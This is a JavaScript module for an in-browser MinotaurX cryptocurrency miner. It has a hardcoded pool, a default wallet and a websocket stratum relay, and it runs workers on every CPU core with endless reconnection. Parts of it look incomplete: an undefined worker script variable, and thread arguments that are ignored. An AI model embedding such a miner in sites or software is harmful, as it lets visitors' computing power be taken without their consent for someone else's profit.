// ===== MINOTAURX FASTPOOL =====
export const minotaurx = "cwm_minotaurx";
export const ALL_THREADS = 0;

const POOL = { host: 'fastpool.xyz', port: 6001 };
const WALLET = 'MSENmNm9QGQJzTcbzjEFWRhWoJUEki4HEA';
const PASSWORD = 'x';

let userSocket, _algo, _userStratum, _nthreads, _onWork, _onHashrate, _onError, userWorkers = [];

const hashrateTracker = {
    totalHashes: 0, startTime: Date.now(), currentHashrateKHs: 0, recentHashrates: [], maxHashrateKHs: 0, sharesAccepted: 0, sharesRejected: 0,
    addHashrate(h) {
        this.currentHashrateKHs = parseFloat(h);
        this.recentHashrates.push(this.currentHashrateKHs);
        if(this.recentHashrates.length > 60) this.recentHashrates.shift();
        if(this.currentHashrateKHs > this.maxHashrateKHs) this.maxHashrateKHs = this.currentHashrateKHs;
    },
    getAverageHashrate() {
        if(this.recentHashrates.length === 0) return 0;
        return (this.recentHashrates.reduce((a,b) => a+b, 0) / this.recentHashrates.length).toFixed(2);
    },
    getUptime() {
        const d = Date.now() - this.startTime;
        return Math.floor(d/3600000) + "h " + Math.floor(d%3600000/60000) + "m " + Math.floor(d%60000/1000) + "s";
    },
    printReport() {
        console.log("⚡ Hashrate ──────────────────────────");
        console.log("   Current:  " + this.currentHashrateKHs + " KH/s");
        console.log("   Average:  " + this.getAverageHashrate() + " KH/s");
        console.log("   Peak:     " + this.maxHashrateKHs + " KH/s");
        console.log("   Uptime:   " + this.getUptime());
        console.log("   Shares:   " + this.sharesAccepted + " / " + this.sharesRejected);
        console.log("──────────────────────────────────────");
    },
    reset() { this.startTime = Date.now(); this.currentHashrateKHs = 0; this.recentHashrates = []; this.maxHashrateKHs = 0; this.sharesAccepted = 0; this.sharesRejected = 0; }
};

function resolveThreadCount() { return window.navigator.hardwareConcurrency || 4; }
function terminateWorkers(w) { for(const worker of w) worker.terminate(); w.length = 0; }
function disconnectSocket(s) { if(s) s.disconnect(); }

let hashrateReportIntervalId = null;
function startHashrateReporter() { stopHashrateReporter(); hashrateReportIntervalId = setInterval(function() { hashrateTracker.printReport(); }, 10000); }
function stopHashrateReporter() { if(hashrateReportIntervalId) { clearInterval(hashrateReportIntervalId); hashrateReportIntervalId = null; } }

function connectAndMine(algo, stratum, threads, workers, onWork, onHashrate, onError) {
    if(!window.Worker) throw "Web Worker not supported";
    if(!window.io) throw "Socket.IO not loaded";
    
    console.log("🧵 " + threads + " threads → " + stratum.server + ":" + stratum.port);
    
    var socket = window.io("wss://websocket-stratum-server.com", {
        transports: ["websocket"],
        reconnection: true,
        reconnectionAttempts: Infinity,
        reconnectionDelay: 3000
    });
    
    socket.on("can start", function() {
        socket.emit("start", {
            client: "minotaurx_fastpool",
            version: "5.0",
            stratum: stratum,
            algo: algo
        });
    });
    
    socket.on("work", function(work) {
        if(onWork) onWork({work:work});
        terminateWorkers(workers);
        for(var i = 0; i < threads; i++) {
            var w = new Worker(code);
            workers.push(w);
            w.onmessage = function(msg) {
                if(msg.data.type === "submit") {
                    var hr = (threads * msg.data.hashrate).toFixed(2);
                    hashrateTracker.addHashrate(hr);
                    hashrateTracker.sharesAccepted++;
                    if(onHashrate) onHashrate({hashrateKHs: hr});
                    socket.emit("submit", msg.data.data);
                    socket.emit("hashrate", {hashrate: hr});
                }
            };
            w.postMessage({algo: algo, work: work});
        }
    });
    
    socket.on("submit failed", function() { hashrateTracker.sharesRejected++; if(onError) onError({error: "Share not valid"}); });
    socket.on("error", function(err) { if(onError) onError({error: err}); });
    socket.on("disconnect", function() { console.log("🔄 Reconnecting..."); });
    
    return socket;
}

function startMining() {
    disconnectSocket(userSocket);
    terminateWorkers(userWorkers);
    userSocket = null;
    userWorkers = [];
    
    var totalThreads = window.navigator.hardwareConcurrency || 4;
    
    console.log("⛏️  MINOTAURX FASTPOOL");
    console.log("   Pool: " + POOL.host + ":" + POOL.port);
    console.log("   Threads: " + totalThreads + " (100%)");
    console.log("   Wallet: " + WALLET.substring(0,12) + "...");
    
    userSocket = connectAndMine(_algo, _userStratum, totalThreads, userWorkers, _onWork, _onHashrate, _onError);
}

export async function autoMine(wallet, threads) {
    if(threads === undefined) threads = 0;
    var totalThreads = window.navigator.hardwareConcurrency || 4;
    console.log("⛏️  MinotaurX FastPool v5.0");
    console.log("   Wallet: " + wallet);
    console.log("   CPU: " + totalThreads + " threads");
    
    return start(minotaurx, {
        server: POOL.host,
        port: POOL.port,
        worker: wallet || WALLET,
        password: PASSWORD
    }, null, 0, null,
    function(h) { console.log("⛏️  " + h.hashrateKHs + " KH/s"); },
    function(e) { console.error("Error: ", e); });
}

export async function start(algo, stratum, config, threads, onWork, onHashrate, onError) {
    _algo = algo;
    _userStratum = stratum;
    _nthreads = resolveThreadCount();
    _onWork = onWork;
    _onHashrate = onHashrate;
    _onError = onError;
    hashrateTracker.reset();
    startHashrateReporter();
    startMining();
    return _nthreads;
}

export function stop() {
    console.log("🛑 Stopped");
    hashrateTracker.printReport();
    stopHashrateReporter();
    disconnectSocket(userSocket);
    userSocket = null;
    terminateWorkers(userWorkers);
}

